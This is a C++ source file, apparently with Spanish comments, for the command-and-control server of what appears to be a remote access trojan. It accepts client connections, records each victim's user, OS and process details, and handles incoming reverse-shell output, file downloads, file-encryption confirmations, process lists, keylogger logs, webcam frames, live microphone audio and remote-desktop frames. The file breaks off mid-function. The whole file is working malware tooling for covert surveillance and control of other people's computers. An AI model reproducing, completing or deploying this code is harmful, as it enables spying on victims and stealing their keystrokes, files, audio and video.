#include "server.hpp"
#include "misc.hpp"
#include "notify.hpp"
#include "frame_client.hpp"
#include "frame_remote_desktop.hpp"
#include "frame_main.hpp"
#include "panel_file_manager.hpp"
#include "panel_process_manager.hpp"
#include "panel_microfono.hpp"
#include "panel_reverse_shell.hpp"
#include "panel_keylogger.hpp"
#include "panel_camara.hpp"
#include "file_editor.hpp"

//Definir el servidor globalmente
Servidor* p_Servidor;
std::mutex vector_mutex;
std::mutex count_mutex;
std::mutex list_mutex;

void Print_Packet(const Paquete& paquete) {
    std::cout << "Tipo paquete: " << paquete.uiTipoPaquete << '\n';
    std::cout << "[CHUNK]Tam buffer: " << paquete.uiTamBuffer << '\n';
    std::cout << "Ultimo: " << paquete.uiIsUltimo << '\n';
    //std::cout << "Buffer: " << paquete.cBuffer.data() << "\n";
}

bool Cliente_Handler::OpenPlayer() {
    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 2;
    wfx.nSamplesPerSec = 11025;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = wfx.wBitsPerSample * wfx.nChannels / 8;
    wfx.nAvgBytesPerSec = wfx.nBlockAlign * wfx.nSamplesPerSec;
    //wfx.cbSize = 0;
    // Abrir el dispositivo de reproducci�n de audio

    if (sizeof(wfx) != sizeof(WAVEFORMATEX)) {
        std::cerr << "Tama�o incorrecto de la estructura WAVEFORMATEX." << std::endl;
        return false;
    }

    // Intentar abrir el dispositivo de reproducci�n de audio
    if (waveOutOpen(&this->wo, WAVE_MAPPER, &wfx, NULL, NULL, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        std::cerr << "Error al abrir el dispositivo de reproducci�n de audio" << std::endl;
        return false;
    }
    return true;
}

void Cliente_Handler::PlayBuffer(char* pBuffer, size_t iLen){
    
    WAVEHDR header = {};
    header.dwFlags = 0;
    header.lpData = pBuffer;
    header.dwBufferLength = iLen;
     

    if (waveOutPrepareHeader(this->wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
        std::cerr << "Error al preparar el encabezado del buffer de audio" << std::endl;
        waveOutUnprepareHeader(this->wo, &header, sizeof(header));
        waveOutClose(this->wo);
        return;
    }

    if (waveOutWrite(this->wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
        std::cerr << "Error al escribir el buffer de audio en el dispositivo de reproducci�n" << std::endl;
        waveOutUnprepareHeader(this->wo, &header, sizeof(header));
        waveOutClose(this->wo);
        return;
    }

    while (waveOutUnprepareHeader(this->wo, &header, sizeof(header)) == WAVERR_STILLPLAYING) {
        // Espera un poco antes de intentar nuevamente
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

//Loop principal del thread del cliente
void Cliente_Handler::Command_Handler(){
    DWORD error_code = 0;
    int iTempRecibido = 0;
    std::vector<char> cBuffer;

    while (true) {
        if (!this->isfRunning()) {
            std::unique_lock<std::mutex> lock(this->mt_Running);
            this->iRecibido = WSA_FUNADO;
            break;
        }
        
        iTempRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, 0, true, &error_code);
        this->SetBytesRecibidos(iTempRecibido);
        
        //timeout / nonblock
        if (error_code == WSAETIMEDOUT || error_code == WSAEWOULDBLOCK) {
            continue;
        }

        /*Desconexion del cliente
        Si no recibio nada y el error no es timeout o se cerro repentinamente*/
        if ((iTempRecibido == SOCKET_ERROR && (error_code != WSAETIMEDOUT || error_code != WSAEWOULDBLOCK)) ||
            iTempRecibido == WSAECONNRESET) {
            if (this->m_isFrameVisible()) {
                this->n_Frame->SetTitle("DESCONECTADO...");
            }
            std::unique_lock<std::mutex> lock(this->mt_Running);
            this->iRecibido = WSA_FUNADO;
            break;
        }else if (iTempRecibido == 0) {
            continue;
        }

        //Agregar datos al queue
        if (iTempRecibido > 0) {
            struct Paquete nNuevo;
            if (p_Servidor->m_DeserializarPaquete(cBuffer.data(), nNuevo, iTempRecibido)) {
                this->Procesar_Paquete(nNuevo);
            }else {
                this->Log("No se pudo deserializar el paquete. Recibido: " + std::to_string(iTempRecibido));
            }
        }
    }

    this->Log("Done!");
    
}

void Cliente_Handler::Add_to_Queue(const Paquete_Queue& paquete) {
    std::unique_lock<std::mutex> lock(this->mt_Queue);
    this->queue_Comandos.push(paquete);
}

void Cliente_Handler::Procesar_Paquete(const Paquete& paquete) {
    std::vector<char>& acumulador = this->paquetes_Acumulados[paquete.uiTipoPaquete];
    size_t oldSize = acumulador.size();
    acumulador.resize(oldSize + paquete.uiTamBuffer);
    memcpy(acumulador.data() + oldSize, paquete.cBuffer.data(), paquete.uiTamBuffer);

    if(paquete.uiIsUltimo == 1){
        acumulador.push_back('\0'); //Borrar este byte al trabajar con datos binarios
        Paquete_Queue nNuevo;
        nNuevo.uiTipoPaquete = paquete.uiTipoPaquete;
        nNuevo.cBuffer.insert(nNuevo.cBuffer.begin(), acumulador.begin(), acumulador.end());

        this->Add_to_Queue(nNuevo);

        this->paquetes_Acumulados.erase(paquete.uiTipoPaquete);
    }
}

void Cliente_Handler::Process_Queue() {

    while (true) {
        
        if (!this->isfRunning() || !this->m_isQueueRunning()) {break;}

        std::unique_lock<std::mutex> lock(this->mt_Queue);

        if (this->queue_Comandos.size() > 0) {
            Paquete_Queue nTemp = this->queue_Comandos.front();
            this->queue_Comandos.pop(); 
            lock.unlock();

            this->Process_Command(nTemp);
        }
    }

    std::unique_lock<std::mutex> lock(this->mt_Queue);
    while (this->queue_Comandos.size() > 0) {
        this->queue_Comandos.pop();
    }
}

void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
    std::vector<std::string> vcDatos;
    int iRecibido = paquete.cBuffer.size();
    int iComando = paquete.uiTipoPaquete;

    //Pquete inicial
    if (iComando == EnumComandos::INIT_PACKET) {
        vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 4);
        if (vcDatos.size() < 4) {
            this->Log("Error procesando los datos " + std::string(paquete.cBuffer.data()));
            return;
        }
        struct Cliente structTmp;

        structTmp._strSo = this->p_Cliente._strSo = vcDatos[0];
        structTmp._strUser = this->p_Cliente._strUser = vcDatos[1];
        structTmp._strPID = this->p_Cliente._strPID = vcDatos[2];
        structTmp._strCpu = this->p_Cliente._strCpu = vcDatos[3];
        structTmp._id = this->p_Cliente._id;
        structTmp._strIp = this->p_Cliente._strIp;

        p_Servidor->m_InsertarCliente(structTmp);

        return;
    }

    //Termino la shell
    if (iComando == EnumComandos::Reverse_Shell_Finish) {
        if (this->m_isFrameVisible()) {
            const char* cBuff = "Sapeeeee";
            this->EscribirSalidaShell(cBuff);
        }
        return;
    }

    //Salida de shell
    if (iComando == EnumComandos::Reverse_Shell_Salida) {
        if (this->m_isFrameVisible()) {
            const char* cBuff = paquete.cBuffer.data();
            this->EscribirSalidaShell(cBuff);
        }
        return;
    }

    //Listar directorio
    if (iComando == EnumComandos::FM_Dir_Folder) {
        if (this->m_isFrameVisible()) {
            ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
            if (temp_list) {
                temp_list->ListarDir(paquete.cBuffer.data());
            }
        }
        return;
    }

    //Listar dispositivos de almacenamiento
    if (iComando == EnumComandos::FM_Discos_Lista) {
        if (this->m_isFrameVisible()) {
            std::vector<std::string> vDrives = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 100);

            if (vDrives.size() > 0) {
                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
                if (temp_list) {
                    temp_list->ListarEquipo(vDrives);
                }

            }
        }
        return;
    }

    //Paquete inicial para descargar archivo
    if (iComando == EnumComandos::FM_Descargar_Archivo_Init) {
        vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 2);
        if (vcDatos.size() == 2) {
            //Tama�o del archivo recibido
            u64 uTamArchivo = StrToUint(vcDatos[1].c_str());

            this->um_Archivos_Descarga[vcDatos[0]].uTamarchivo = uTamArchivo;

            std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
            p_Servidor->vcTransferencias[vcDatos[0]].uTamano = uTamArchivo;
            lock.unlock();

            DEBUG_MSG("[ID-" + vcDatos[0] + "]Tam archivo: ");
            DEBUG_MSG(uTamArchivo);
        }
        return;
    }

    //Paquete de archivo
    if (iComando == EnumComandos::FM_Descargar_Archivo_Recibir) {
        vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
        if (vcDatos.size() == 1) {
            int iHeader = vcDatos[0].size() + 1;
            int iBytesSize = iRecibido - iHeader - 1; //1 byte del delimitador y otro del \0 agregado al procesar el paquete
            const char* cBytes = paquete.cBuffer.data() + iHeader;
            
            if (this->um_Archivos_Descarga[vcDatos[0]].ssOutFile.get()->is_open()) {
                this->um_Archivos_Descarga[vcDatos[0]].ssOutFile.get()->write(cBytes, iBytesSize);
                //Por los momentos solo es necesario que el servidor almacene el progreso
                //this->um_Archivos_Descarga[vcDatos[1]].uDescargado += iBytesSize;

                std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
                p_Servidor->vcTransferencias[vcDatos[0]].uDescargado += iBytesSize;
            }else {
                this->Log("El archivo no esta abierto");
            }
        }
        return;
    }

    //Se termino la descarga del archivo
    if (iComando == EnumComandos::FM_Descargar_Archivo_End) {
        std::string strID = paquete.cBuffer.data();
        if (this->um_Archivos_Descarga[strID].ssOutFile->is_open()) {
            this->um_Archivos_Descarga[strID].ssOutFile->close();
        }
        this->Log("[!] Descarga completa");
        return;
    }

    //Paquet de editor de texto remoto
    if (iComando == EnumComandos::FM_Editar_Archivo_Paquete) {
        if (this->m_isFrameVisible()) {
            vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
            if (vcDatos.size() == 1) {
                //Tama�o del id del comando, id del archivo y dos back slashes
                int iHeadSize = vcDatos[0].size() + 1;
                const char* cBytes = paquete.cBuffer.data() + iHeadSize;

                wxEditForm* temp_edit_form = (wxEditForm*)wxWindow::FindWindowByName(vcDatos[0], this->n_Frame);
                if (temp_edit_form) {
                    temp_edit_form->AgregarTexto(cBytes);
                }
                else {
                    this->Log("No se pudo encontrar la ventana con id " + vcDatos[0]);
                }
            }else {
                DEBUG_MSG("No se pudo parsear el contenido de edicion remota:");
                DEBUG_MSG(paquete.cBuffer.data());
            }
        }
        return;
    }

    //Confirmacion de cifrado
    if (iComando == EnumComandos::FM_Crypt_Confirm) {
        std::string strRes = paquete.cBuffer.data();
        wxString strMessage = "";
        if (strRes == "1") {
            strMessage = "[CRYPT] No se pudo abrir el archivo de entrada";
        }else if (strRes == "2") {
            strMessage = "[CRYPT] No se pudo abrir el archivo de salida";
        }else if (strRes == "3") {
            strMessage = "[CYRPT] Operacion completada";
        }

        wxMessageBox(strMessage, "Cifrado de archivos", wxOK, nullptr);
        return;
    }

    //El cliente envio la ruta actual del administrador de archivos
    if (iComando == EnumComandos::FM_CPATH) {
        if (this->m_isFrameVisible()) {
            panelFileManager* temp_panel = (panelFileManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM, this->n_Frame);
            if (temp_panel) {
                const char* cBuff = paquete.cBuffer.data();
                temp_panel->ActualizarRuta(cBuff);
            }else {
                this->Log("No se pudo encontrar panel FM activo");
            }
        }
        return;
    }

    //Lista de procesos remotos
    if (iComando == EnumComandos::PM_Lista) {
        if (this->m_isFrameVisible()) {
            panelProcessManager* panel_proc = (panelProcessManager*)wxWindow::FindWindowById(EnumIDS::ID_PM_Panel, this->n_Frame);
            if (panel_proc) {
                panel_proc->listManager->AgregarData(std::string(paquete.cBuffer.data()), this->p_Cliente._strPID);
            }
        }
        return;
    }

    //Log del keylogger
    if (iComando == EnumComandos::KL_Salida) {
        if (this->m_isFrameVisible()) {
            panelKeylogger* temp_panel = (panelKeylogger*)wxWindow::FindWindowById(EnumIDS::ID_KL_Panel, this->n_Frame);
            if (temp_panel) {
                const char* cBuff = paquete.cBuffer.data();
                temp_panel->AgregarData(cBuff);
            }else {
                this->Log("[X] No se pudo encontrar el panel keylogger");
            }
        }
        return;
    }

    //mod camara - Lista de dispositivos
    if (iComando == EnumComandos::CM_Lista_Salida) {
        if (this->m_isFrameVisible()) {
            panelCamara* temp_panel_cam = (panelCamara*)wxWindow::FindWindowById(EnumCamMenu::ID_Main_Panel, this->n_Frame);
            if (temp_panel_cam) {
                const char* cBuff = paquete.cBuffer.data();
                temp_panel_cam->ProcesarLista(cBuff);
            } 
        }
        return;
    }

    //mod camara - Buffer de video de la camara
    if (iComando == EnumComandos::CM_Single_Salida) {
        if (this->m_isFrameVisible()) {
            vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
            if (vcDatos.size() == 1) {
                int iHeadSize = vcDatos[0].size() + 1; //len del id del dev
                int iBuffSize = iRecibido - iHeadSize - 1;
                const char* cBytes = paquete.cBuffer.data() + iHeadSize;
                panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[0], this->n_Frame);
                if (panel_picture) {
                    panel_picture->OnDrawBuffer(cBytes, iBuffSize);
                }else {
                    this->Log("[X] No se pudo encontrar el panel de camara");
                }
            }
        }
        return;
    }

    //mod microfono - Lista de dispositivos
    if (iComando == EnumComandos::Mic_Refre_Resultado) {
        if (this->m_isFrameVisible()) {
            panelMicrophone* temp_mic_panel = (panelMicrophone*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Microphone, this->n_Frame);
            if (temp_mic_panel) {
                const char* cBuff = paquete.cBuffer.data();
                temp_mic_panel->ProcesarLista(cBuff);
            }else {
                DEBUG_MSG("[MIC]No se pudo encontrar ventana activa");
            }
        }
        return;
    }

    //mod microfono - Reproducir buffer de audio
    if (iComando == EnumComandos::Mic_Live_Packet) {
        if (this->m_isFrameVisible()) {
            if (this->OpenPlayer()) {
                char* cbuff = (char*)paquete.cBuffer.data();
                this->PlayBuffer(cbuff, iRecibido - 1);
                this->ClosePlayer();
            }
            else {
                this->Log("No se pudo abrir el reproductor");
            }
        }
        return;
    }

    //mod escritorio remoto - lista monitores
    if (iComando == EnumComandos::RD_Lista_Salida) {
        if (this->m_isFrameVisible()) {
            frameRemoteDesktop* temp_rd_frame = (frameRemoteDesktop*)wxWindow::FindWindowById(EnumRemoteDesktop::ID_Main_Frame, this->n_Frame);
            if (temp_rd_frame) {
                const char* cBuff = paquete.cBuffer.data();
                temp_rd_frame->ProcesarLista(cBuff);
            }
        }
        return;
    }

    //mod escritorio remoto - Buffer de video del escritorio
    if (iComando == EnumComandos::RD_Salida) {
        if (this->m_isFrameVisible()) {
            frameRemoteDesktop* temp_rd_frame = (frameRemoteDesktop*)wxWindow::FindWindowById(EnumRemoteDesktop::ID_Main_Frame, this->n_Frame);
            if (temp_rd_frame) {
                const char* cBufferImagen = paquete.cBuffer.data();
                temp_rd_frame->OnDrawBuffer(cBufferImagen, iRecibido-1);
            }
        }
        return;
    }

}

void Cliente_Handler::EscribirSalidaShell(const char*& cBuffer) {
    panelReverseShell* panel_shell = (panelReverseShell*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Reverse_Shell, this->n_Frame);
    if (panel_shell) {
        panel_shell->EscribirSalida(cBuffer);
    }
    return;
}

void Cliente_Handler::Spawn_Threads() {
    this->p_thHilo = std::thread(&Cliente_Handler::Command_Handler, this);
    this->p_thQueue = std::thread(&Cliente_Handler::Process_Queue, this);
}

//funcion que crea el frame principal para interactuar con el cliente
void Cliente_Handler::CrearFrame(const std::string strTitle,const std::string strID) {
    this->m_setFrameVisible(true);
    this->n_Frame = DBG_NEW FrameCliente(strTitle, this->p_Cliente._sckCliente, this->p_Cliente._strIp);
    this->n_Frame->Show(true);
}

void MyLogClass::LogThis(std::string strInput, int iType){
    time_t temp = time(0);
    struct tm *timeptr = localtime(&temp);

    std::string strLine = "";
    
    switch (iType){
        case LogType::LogMessage:
            strLine = "[-] ";
            break;
        case LogType::LogError:
            strLine = "[X] ";
            break;
        case LogType::LogWarning:
            strLine = "[!] ";
            break;
        default:
            strLine = "[-] ";
            break; 
    }
    
    strLine += "[" + std::to_string(timeptr->tm_hour);
    strLine += ":" + std::to_string(timeptr->tm_min) + ":";
    strLine += std::to_string(timeptr->tm_sec) + "]  ";
    strLine += strInput + "\n";

   // std::lock_guard<std::mutex> lock(this->log_mutex);
    if (this->p_txtCtrl != nullptr) {
        this->p_txtCtrl->AppendText(strLine);
    }

}

void Servidor::Init_Key() {
    for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
        this->bKey.push_back(this->t_key[i]);
    }
}

Servidor::Servidor(){
    this->uiPuertoLocal = 65500;

    //clase para logear
    this->m_txtLog = DBG_NEW MyLogClass();

    this->Init_Key();

}

bool Servidor::m_Iniciar(){
    WSACleanup();
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0){
        return false;
    }

    this->sckSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if(!this->sckSocket){
        this->m_txtLog->LogThis("No se pudo crear el socket", LogType::LogError);
        return false;
    }

    int iTemp = 1;
    if(setsockopt(this->sckSocket, SOL_SOCKET, SO_REUSEADDR, (const char*)&iTemp, sizeof(iTemp)) < 0){
        this->m_txtLog->LogThis("Error configurando el socket SO_REUSEADDR", LogType::LogError);
        return false;
    }

    unsigned long int iBlock = 1;
    if(ioctlsocket(this->sckSocket, FIONBIO, &iBlock) != 0){
        this->m_txtLog->LogThis("[SERVER] Error configurando el socket NON_BLOCK", LogType::LogError);
        ERROR("<----");
        return false;
    }

    this->structServer.sin_family        =                    AF_INET;
    this->structServer.sin_port          = htons(this->uiPuertoLocal);
    this->structServer.sin_addr.s_addr   =                 INADDR_ANY;
    if(bind(this->sckSocket, (struct sockaddr *)&this->structServer, sizeof(struct sockaddr)) == -1){
        this->m_txtLog->LogThis("Error configurando el socket BIND", LogType::LogError);
        return false;
    }

    if(listen(this->sckSocket, 10) == -1){
        this->m_txtLog->LogThis("Error configurando el socket LISTEN", LogType::LogError);
        return false;
    }

    return true;
}

ClientConInfo Servidor::m_Aceptar(){
    struct ClientConInfo structNuevo;
    struct sockaddr_in structCliente;
    int iTempC = sizeof(struct sockaddr_in);
    SOCKET tmpSck = accept(this->sckSocket, (struct sockaddr *)&structCliente, &iTempC) ;
    if(tmpSck != INVALID_SOCKET){
        char strIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(structCliente.sin_addr), strIP, INET_ADDRSTRLEN);
        std::string strTmp = "Nueva conexion de ";
        strTmp += strIP;
        strTmp +=  ":" + std::to_string(ntohs(structCliente.sin_port));
        
        this->m_txtLog->LogThis(strTmp, LogType::LogMessage);

        DWORD timeout = CLI_TIMEOUT_MILSECS; //100 miliseconds timeout
        setsockopt(tmpSck, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof timeout);
        
        structNuevo._strPuerto = std::to_string(ntohs(structCliente.sin_port));
        structNuevo._sckSocket = tmpSck;
        structNuevo._strIp = strIP;
    } else {
        structNuevo._sckSocket = tmpSck;
    }
        
    return structNuevo;
}

void Servidor::m_Handler(){
    this->p_Escuchando = true;

    this->thListener = std::thread(&Servidor::m_Escucha, this);
    this->thCleanVC = std::thread(&Servidor::m_CleanVector, this);
}

void Servidor::m_JoinThreads() {
    if (this->thCleanVC.joinable()) {
        this->thCleanVC.join();
    }

    if (this->thListener.joinable()) {
        this->thListener.join();
    }

    this->m_txtLog->LogThis("Thread LISTENER terminada", LogType::LogMessage);
}

void Servidor::m_StopHandler() {
    this->m_txtLog->LogThis("Apagando", LogType::LogError);
    std::lock_guard<std::mutex> lock(this->p_mutex);
    this->p_Escuchando = false;
    m_CerrarConexion(this->sckSocket);
}

void Servidor::m_CerrarConexion(SOCKET pSocket) {
    if (pSocket != INVALID_SOCKET) {
        DEBUG_MSG("Cerrando socket:"); DEBUG_MSG(pSocket);
        closesocket(pSocket);
        pSocket = INVALID_SOCKET;
    }
}

void Servidor::m_CerrarConexiones() {
    std::unique_lock<std::mutex> lock(vector_mutex); //<------------------------------- DBG_NEW
    if (this->vc_Clientes.size() > 0) {
        for(int iIndex = 0; iIndex<int(this->vc_Clientes.size()); iIndex++){
            this->m_CerrarConexion(this->vc_Clientes[iIndex]->p_Cliente._sckCliente);
        }
    }
    
    m_CerrarConexion(this->sckSocket);
}

void Servidor::m_CleanVector() {
    while (true) {
        if (!this->m_Running()) {
            break;
        }
    
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        int iNumeroClientes = this->m_NumeroClientes(vector_mutex);
        if (iNumeroClientes == 0) {
            continue;
        }
        
        for(int iIndex = 0; iIndex < iNumeroClientes; iIndex++){
            if(!this->m_IsRunning(vector_mutex, iIndex) && this->m_Running()){
                std::string streTempID = this->m_ClienteID(vector_mutex, iIndex);
                
                this->m_RemoverClienteLista(streTempID);
                
                std::string strTmp = "Cliente " + this->m_ClienteIP(vector_mutex, iIndex) + " - desconectado";
                this->m_txtLog->LogThis(strTmp, LogType::LogMessage);

                //El vector cambia de tamaño, con esto se asegura obtener la posicion real
                int iRealIndex = this->IndexOf(this->m_ClienteID(vector_mutex, iIndex));
                this->m_BorrarCliente(vector_mutex, iRealIndex);
                
            }else if (!this->m_Running()) {
                //Cerra el loop y no iterar por todos si ya no esta escuchando
                break;
            }
        }
    }
    DEBUG_MSG("Thread CLEANER terminada");
    
    int iNumeroClientes = this->m_NumeroClientes(vector_mutex);
    for (int iIndex2 = 0; iIndex2 < iNumeroClientes; iIndex2++) {
        this->m_BorrarCliente(vector_mutex, iIndex2, true);
    }

    this->vc_Clientes.clear();
}

void Servidor::m_MonitorTransferencias() {
    while (true){
        std::unique_lock<std::mutex> lock(this->p_transfers);
        if (!this->p_Transferencias) {
            break;
        }
        lock.unlock();

        auto parent = (wxFrame*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Transferencias);
        if (parent) {
            auto list_transfer = (wxListCtrl*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Transferencias_List, parent);
            if (list_transfer) {
                list_transfer->DeleteAllItems();

                std::unique_lock<std::mutex> lock2(this->p_transfers);
                int iRowCount = 0;
                for (auto& tc : this->vcTransferencias) {
                    list_transfer->InsertItem(iRowCount, wxString(tc.second.strCliente));
                    list_transfer->SetItem(iRowCount, 1, wxString(tc.second.strNombre));
                    list_transfer->SetItem(iRowCount, 2, wxString(tc.second.uDescargado >= tc.second.uTamano ? "TRANSFERIDO" : (tc.second.isUpload ? "SUBIENDO" : "DESCARGANDO")));

                    double dPercentage = (tc.second.uDescargado / tc.second.uTamano) * 100;
                    wxString strPor = std::to_string(dPercentage);
                    strPor.append(1, '%');
                    list_transfer->SetItem(iRowCount++, 3, wxString(strPor));
                }
            } else {
               DEBUG_MSG("No se pudo encontrar el list abierto");
            }
        }else {
            DEBUG_MSG("No se pudo encontrar el panel abierto");
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
    
}

void Servidor::m_Escucha(){
    this->m_txtLog->LogThis("Thread LISTENER iniciada", LogType::LogMessage);
    
    //Crear descriptor and setearlo a zero
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    
    fd_set fdMaster;
    FD_ZERO(&fdMaster);
    FD_SET(this->sckSocket, &fdMaster);
    
    while(this->m_Running()){
        fd_set fdMaster_copy = fdMaster;
        
        int iNumeroSockets = select(this->sckSocket + 1, &fdMaster_copy, nullptr, nullptr, &timeout);
        for (int iCont = 0; iCont < iNumeroSockets; iCont++) {
            SOCKET iSock = fdMaster_copy.fd_array[iCont];

            if (iSock == this->sckSocket) {
                //Nueva conexion
                struct ClientConInfo sckNuevoCliente = this->m_Aceptar();
                if (sckNuevoCliente._sckSocket == INVALID_SOCKET) {
                    //socket invalido
                    continue;
                }
                //IP:PUERTO
                std::string strtmpIP = sckNuevoCliente._strIp;
                strtmpIP.append(1, ':');
                strtmpIP.append(sckNuevoCliente._strPuerto);

                //RANDOM ID
                std::string strTmpId = RandomID(7);
                strTmpId.append(1, '-');
                strTmpId += std::to_string(sckNuevoCliente._sckSocket);

                struct Cliente structNuevoCliente;
                structNuevoCliente._sckCliente = sckNuevoCliente._sckSocket;
                structNuevoCliente._ttUltimaVez = time(0);
                structNuevoCliente._id = strTmpId;
                structNuevoCliente._strIp = strtmpIP;

                std::string strTest = strtmpIP;
                std::string strTitle = "["+strTmpId+"] Nueva conexion";
                
                wxTheApp->CallAfter([strTest, strTitle] {
                    std::shared_ptr<MyNotify> n_notify = MyNotify::Create(nullptr, strTitle, strTest, 5);
                });
                
                //Agregar el cliente al vector global - se agrega a la list una vez se reciba la info
                std::unique_lock<std::mutex> lock(vector_mutex);
                this->vc_Clientes.push_back(DBG_NEW Cliente_Handler(structNuevoCliente));
                this->vc_Clientes[this->vc_Clientes.size() - 1]->Spawn_Threads();
                
            }

        }
    }
    DEBUG_MSG("DONE Listen");
}

int Servidor::IndexOf(std::string strID) {
    std::lock_guard<std::mutex> lock(vector_mutex);
    if (strID == "sofocante") { return -1; }
    bool isFound = false;
    int iIndex = 0;
    for (; iIndex < this->vc_Clientes.size(); iIndex++) {
        if (this->vc_Clientes[iIndex]->p_Cliente._id == strID) {
            isFound = true;
            break;
        }
    }
    
    if (!isFound) { iIndex = -1; }

    return iIndex;
}

void Servidor::m_InsertarCliente(struct Cliente& p_Cliente){
    std::unique_lock<std::mutex> lock(list_mutex);

    int iIndex = this->m_listCtrl->GetItemCount();

    this->m_listCtrl->InsertItem(iIndex, wxString(p_Cliente._id));
    this->m_listCtrl->SetItem(iIndex, 1, wxString(p_Cliente._strUser));
    this->m_listCtrl->SetItem(iIndex, 2, wxString(p_Cliente._strIp));
    this->m_listCtrl->SetItem(iIndex, 3, wxString(p_Cliente._strSo));
    this->m_listCtrl->SetItem(iIndex, 4, wxString(p_Cliente._strPID));
    this->m_listCtrl->SetItem(iIndex, 5, wxString(p_Cliente._strCpu));
}

void Servidor::m_RemoverClienteLista(std::string p_ID){
    std::unique_lock<std::mutex> lock(list_mutex);

    long lFound = this->m_listCtrl->FindItem(0, wxString(p_ID));
    if(lFound != wxNOT_FOUND){
        this->m_listCtrl->DeleteItem(lFound);
    } else{
        DEBUG_MSG("No se pudo encontrar el cliente " + p_ID);
    }
    
}

int Servidor::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, int iTipoPaquete) {
    //Aqui hacer loop para enviar por partes el buffer
    int iEnviado      =    0;
    int iRestante     =    0;
    int iBytePos      =    0;
    int iChunkSize    =    0;
    int iChunkEnviado =    0;
    int iDataSize     = pLen;

    struct Paquete nPaquete;
    int iPaquet_Size = (sizeof(int) * 3) + PAQUETE_BUFFER_SIZE;
    char cPaqueteSer[(sizeof(int) * 3) + PAQUETE_BUFFER_SIZE];

    while (true) {
        iRestante = (iDataSize > iPaquet_Size) ? iDataSize - iPaquet_Size : iDataSize;

        //Si aun hay bytes por enviar
        if (iRestante > 0) {
            //Determinar el tamano el pedazo a enviar
            if (iRestante >= PAQUETE_BUFFER_SIZE) {
                iChunkSize = PAQUETE_BUFFER_SIZE;
            }
            else {
                //Leer el ultimo pedazo
                iChunkSize = iRestante;
            }
            iDataSize -= iChunkSize;

            //Armar paquete a serializar
            nPaquete.uiTipoPaquete =           iTipoPaquete;
            nPaquete.uiTamBuffer   =             iChunkSize;
            nPaquete.uiIsUltimo    = iDataSize == 0 ? 1 : 0;
            nPaquete.cBuffer.resize( iChunkSize );
            if (nPaquete.cBuffer.size() < iChunkSize) {
                DEBUG_MSG("[CHUNK] No se pudo reservar memoria");
                break;
            }

            int iFinalSize = (sizeof(int) * 3) + iChunkSize;
            
            memcpy(nPaquete.cBuffer.data(), pBuffer + iBytePos, iChunkSize);

            Print_Packet(nPaquete);

            this->m_SerializarPaquete(nPaquete, cPaqueteSer);

            iChunkEnviado = this->cSend(pSocket, cPaqueteSer, iFinalSize, pFlags, isBlock, 0);
            if (iChunkEnviado == SOCKET_ERROR || iChunkEnviado == WSAECONNRESET) {
                DEBUG_MSG("[CHUNK] Error enviando el chunk");
                break;
            }
            iEnviado += iChunkEnviado;
            iBytePos +=    iChunkSize;
        }else {
            break;
        }

    }

    return iEnviado;
}

int Servidor::send_all(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags) {
    int iEnviado = 0;
    int iTotalEnviado = 0;
    while (iTotalEnviado < pLen) {
        iEnviado = send(pSocket, pBuffer + iTotalEnviado, pLen - iTotalEnviado, pFlags);
        if (iEnviado == 0) {
            break;
        }else if (iEnviado == SOCKET_ERROR || iEnviado == WSAECONNRESET) {
            return iEnviado;
        }
        iTotalEnviado += iEnviado;
    }

    return iTotalEnviado;
}

int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, int iTipoPaquete) {
    // 1 non block
    // 0 block

    std::unique_lock<std::mutex> lock(this->p_sckmutex);

    //Tamaño del buffer
    int iDataSize = pLen;

    //Vector que aloja el buffer cifrado
    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize);
    iDataSize = cData.size();
    if (iDataSize == 0) {
        ERROR("Error encriptando los datos a enviar");
        return 0;
    }

    //Enviar al inicio el size del paquete
    std::vector<char> cBufferFinal(iDataSize + sizeof(int));
    memcpy(cBufferFinal.data(), &iDataSize, sizeof(int));
    memcpy(cBufferFinal.data() + sizeof(int), cData.data(), iDataSize);
    
    iDataSize += sizeof(int);

    int iEnviado = 0;
    unsigned long int iBlock = 0;

    if (isBlock) {
        //Hacer el socket block
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DEBUG_MSG("[cSend]Error configurando el socket NON_BLOCK");
        }
    }

    iEnviado = send_all(pSocket, cBufferFinal.data(), iDataSize, pFlags);

